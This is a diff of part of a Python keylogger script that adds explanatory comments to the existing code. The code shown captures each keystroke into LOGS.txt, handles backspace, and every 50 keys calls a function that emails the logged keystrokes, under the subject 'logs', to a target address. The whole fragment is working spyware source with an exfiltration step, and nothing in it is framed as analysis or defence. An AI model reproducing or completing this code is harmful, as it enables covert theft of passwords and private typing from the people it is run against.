@@ -16,7 +16,7 @@ target = [email] # Must be a list, can enter other emails
 msg = MIMEText(data) # sets the contents of the email
 msg['Subject'] = 'logs' # sets the subject
 msg['From'] = sender # sets who is the email from
-msg['To'] = ', '.join(target) # sets who to send to
+msg['To'] = ', '.join(target) # sets who to send the email to
 
 
 timer = 0 # sets the timer to 0
@@ -31,24 +31,24 @@ while True:
 
     timer += 1 # add 1 to the timer
     print(timer) #prints the timer
-    key = getkey() #gets the key
-    L = open('LOGS.txt', "a")
+    key = getkey() #gets the key that was pressed
+    L = open('LOGS.txt', "a") #Opens the logs
     with open('LOGS.txt') as infile:
       words = 0
       characters = 0
-      for lineno, line in enumerate(infile, 1):
+      for lineno, line in enumerate(infile, 1): # for every line
         wordslist = line.split()
         words += len(wordslist)
-        characters += sum(len(word) for word in wordslist)
+        characters += sum(len(word) for word in wordslist) #checks the worsd
     if key == '' and characters != 0:
       with open('LOGS.txt', 'rb+') as filehandle:
         filehandle.seek(-1, os.SEEK_END)
-        filehandle.truncate()
+        filehandle.truncate() #errases if backspace is pressed
     elif key != '':
-      L.write(key)
+      L.write(key) #write the key if it isnt backspace
       L.close()
-    if timer == 50:
-      timer  = 0
-      SendMail()
+    if timer == 50: #checks if 50 keys were pressed
+      timer  = 0 #resets the timer
+      SendMail() #sends the email
       
     
